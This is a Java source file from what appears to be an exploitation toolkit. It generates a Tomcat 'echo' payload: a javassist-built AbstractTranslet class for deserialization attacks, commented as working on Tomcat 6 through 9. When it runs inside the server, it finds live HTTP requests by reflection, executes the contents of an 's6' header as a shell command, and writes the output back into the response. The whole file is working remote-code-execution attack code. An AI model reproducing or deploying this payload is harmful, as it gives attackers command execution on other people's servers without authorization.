package cn.safe6.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import org.apache.coyote.RequestInfo;

public class TomcatEchoAll {

    // Tomcat 全版本 payload，测试通过 tomcat6,7,8,9
    public static byte[] getPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));

        CtClass ctClass = classPool.makeClass("tomcatEchoAll" + System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("private static void writeBody(Object resp, byte[] bs) throws Exception {\n" +
                "    Object o;\n" +
                "    Class clazz;\n" +
                "    try {\n" +
                "        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                "        o = clazz.newInstance();\n" +
                "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\n\"});\n" +
                "    } catch (Exception e) {\n" +
                "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
                "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{\"$$$\\n\"});\n" +
                "    } \n" +
                "}", ctClass));

        ctClass.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
                "    java.lang.reflect.Field f = null;\n" +
                "    Class clazz = o.getClass();\n" +
                "    while (clazz != Object.class) {\n" +
                "        try {\n" +
                "            f = clazz.getDeclaredField(s);\n" +
                "            break;\n" +
                "        } catch (NoSuchFieldException e) {\n" +
                "            clazz = clazz.getSuperclass();\n" +
                "        }\n" +
                "    }\n" +
                "    if (f == null) {\n" +
                "        throw new NoSuchFieldException(s);\n" +
                "    }\n" +
                "    f.setAccessible(true);\n" +
                "    return f.get(o);\n" +
                "}\n", ctClass));

        ctClass.addConstructor(CtNewConstructor.make("public tomcatEchoAll() throws Exception {\n" +
                "    Object o;\n" +
                "    Object resp;\n" +
                "    String s;\n" +
                "    boolean done = false;\n" +
                "    Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "    for (int i = 0; i < ts.length; i++) {\n" +
                "        Thread t = ts[i];\n" +
                "        if (t == null) {\n" +
                "            continue;\n" +
                "        }\n" +
                "        s = t.getName();\n" +
                "        if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
                "            o = getFV(t, \"target\");\n" +
                "            if (!(o instanceof Runnable)) {\n" +
                "                continue;\n" +
                "            }\n" +
                "\n" +
                "            try {\n" +
                "                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
                "            } catch (Exception e) {\n" +
                "                continue;\n" +
                "            }\n" +
                "\n" +
                "            java.util.List ps = (java.util.List) getFV(o, \"processors\");\n" +
                "            for (int j = 0; j < ps.size(); j++) {\n" +
                "                Object p = ps.get(j);\n" +
                "                o = getFV(p, \"req\");\n" +
                "                resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n" +
                "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"s6\"});\n" +
                "                if (s != null && !s.isEmpty()) {\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n" +
                "                    writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes());\n" +
                "                    done = true;\n" +
                "                }\n" +
                "\n" +
                "                if (done) {\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "            if (done) {\n" +
                "                break;\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}", ctClass));
        return ctClass.toBytecode();
    }

}
